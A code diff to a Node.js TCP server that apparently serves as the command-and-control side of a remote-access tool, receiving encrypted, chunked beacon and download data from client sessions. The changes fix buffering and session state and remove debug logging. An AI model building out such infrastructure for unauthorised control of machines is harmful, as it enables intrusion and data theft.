@@ -20,35 +20,34 @@ const server = createServer((socket) => {
         const { decryptData } = require('../modules/encdec');
         const { handleDownloadResponse, handleResponse, handleBeacon } = require('../modules/handlers');
         
-        const client = getClient(sessionId);
+        const payloadStr = payload.toString('utf8');
+
+        let client = getClient(sessionId);
 
         try {
-            if (payload.length >= config.data.chunk_size || payload.includes('--FIN--')) {
-                // chunk mode
-                upsertClientSession(sessionId, {waiting: true, buffer: client.buffer += payload})
+            if (payloadStr.length >= config.data.chunk_size || payloadStr.includes('--FIN--')) {
+                // chunk mode                            
+                upsertClientSession(sessionId, {waiting: true, buffer: client.buffer + payloadStr});
                 
-                client.waiting = true;
-                client.buffer += payload;
+                client = getClient(sessionId);
 
-                if (client.buffer.includes('--FIN--')) {
+                if (client.buffer && client.buffer.includes('--FIN--')) {
                     const bufferChunks = client.buffer.replace('--FIN--', '');
-                    const decrypted = await decryptData(bufferChunks.toString('utf8'), client.sessionId);
+                    const decrypted = await decryptData(bufferChunks, client.sessionId);
                     const parsed = JSON.parse(decrypted);
                     const response = parsed.response;
                     
                     if (response.download) {
                         await handleDownloadResponse(response);
                     } else {
-                        console.log('response', response);
                         handleResponse(response);
                     }
                     
-                    client.waiting = false;
-                    client.buffer = '';
+                    upsertClientSession(sessionId, {waiting: false, buffer: null});
                 }
             } else {
                 // non-chunk mode
-                const decrypted = await decryptData(payload.toString('utf8'), client.sessionId);
+                const decrypted = await decryptData(payloadStr, client.sessionId);
                 const parsed = JSON.parse(decrypted);
                 const response = parsed.response;
 
@@ -60,7 +59,6 @@ const server = createServer((socket) => {
                 } else if (response.error) {
                     logError(response.error);
                 } else {
-                    console.log('response', response);
                     handleResponse(response);
                 }
             }
@@ -93,7 +91,7 @@ const server = createServer((socket) => {
         upsertClientSession(sessionId, {active: false});
     });
     
-    socket.pipe(socket);
+    //socket.pipe(socket);
 });
 
 /**
